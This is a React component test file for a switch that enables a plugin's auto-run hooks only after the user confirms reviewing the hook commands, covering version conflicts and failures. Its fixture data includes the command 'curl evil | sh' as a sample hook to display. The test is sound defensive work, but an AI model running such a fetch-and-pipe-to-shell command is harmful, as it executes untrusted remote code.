// @vitest-environment jsdom

import { fireEvent, render, screen, waitFor } from '@testing-library/react';
import { beforeAll, beforeEach, describe, expect, it, vi } from 'vitest';
import { ApiError } from '@/lib/api';

const { detail, patch, refetch } = vi.hoisted(() => ({
  detail: { data: undefined as unknown, isError: false, isFetching: false },
  patch: vi.fn(),
  refetch: vi.fn(),
}));
vi.mock('@/hooks/useHarnessProfiles', () => ({
  useHarnessProfile: () => ({ ...detail, refetch }),
  usePatchProfile: () => ({ isPending: false, mutateAsync: patch }),
}));

const { HooksSwitch } = await import('./HooksSwitch');

beforeAll(() => {
  HTMLDialogElement.prototype.showModal = function (this: HTMLDialogElement) {
    this.setAttribute('open', '');
  };
  HTMLDialogElement.prototype.close = function (this: HTMLDialogElement) {
    this.removeAttribute('open');
    this.dispatchEvent(new Event('close'));
  };
});

beforeEach(() => {
  vi.clearAllMocks();
  patch.mockResolvedValue({});
  refetch.mockResolvedValue({});
  detail.isError = false;
  detail.isFetching = false;
  detail.data = {
    autoRunSources: [
      { commands: ['curl evil | sh'], kind: 'hooks', path: 'hooks/hooks.json', unreadable: null },
      { commands: [], kind: 'plugin', path: 'plugin.json', unreadable: 'file too large' },
    ],
    latestVersion: 3,
  };
});

const open = () => fireEvent.click(screen.getByRole('switch', { name: 'Hooks for review-kit' }));

describe('HooksSwitch', () => {
  it('shows the latest sources and needs the reviewed box before turning hooks on', async () => {
    render(<HooksSwitch enabled={false} name="review-kit" />);
    open();
    expect(screen.getByText('hooks/hooks.json')).toBeTruthy();
    expect(screen.getByText('curl evil | sh')).toBeTruthy();
    expect(screen.getByText(/Could not be read, treated as unsafe: file too large/)).toBeTruthy();
    const submit = screen.getByRole('button', { name: 'Turn hooks on' }) as HTMLButtonElement;
    expect(submit.disabled).toBe(true);
    fireEvent.click(screen.getByRole('checkbox', { name: 'I have reviewed these hook sources' }));
    expect(submit.disabled).toBe(false);
    fireEvent.click(submit);
    await waitFor(() =>
      expect(patch).toHaveBeenCalledWith({
        expectedVersion: 3,
        hooksEnabled: true,
        name: 'review-kit',
      })
    );
  });

  it('reloads and asks again when the version moved', async () => {
    patch.mockRejectedValueOnce(
      new ApiError('moved', 409, 'HOOKS_VERSION_STALE', { latestVersion: 4 })
    );
    render(<HooksSwitch enabled={false} name="review-kit" />);
    open();
    fireEvent.click(screen.getByRole('checkbox', { name: 'I have reviewed these hook sources' }));
    fireEvent.click(screen.getByRole('button', { name: 'Turn hooks on' }));
    expect(await screen.findByText(/A newer version of the plugin landed/)).toBeTruthy();
    expect(refetch).toHaveBeenCalled();
    const box = screen.getByRole('checkbox', { name: 'I have reviewed these hook sources' });
    expect((box as HTMLInputElement).checked).toBe(false);
    expect(
      (screen.getByRole('button', { name: 'Turn hooks on' }) as HTMLButtonElement).disabled
    ).toBe(true);
  });

  it('turns hooks off after a confirmation, sending no version', async () => {
    render(<HooksSwitch enabled name="review-kit" />);
    open();
    fireEvent.click(screen.getByRole('button', { name: 'Turn hooks off' }));
    await waitFor(() =>
      expect(patch).toHaveBeenCalledWith({ hooksEnabled: false, name: 'review-kit' })
    );
  });

  it('shows a failure and changes nothing else', async () => {
    patch.mockRejectedValue(new Error('Forbidden'));
    render(<HooksSwitch enabled={false} name="review-kit" />);
    open();
    fireEvent.click(screen.getByRole('checkbox', { name: 'I have reviewed these hook sources' }));
    fireEvent.click(screen.getByRole('button', { name: 'Turn hooks on' }));
    expect(await screen.findByText('Forbidden')).toBeTruthy();
  });
});
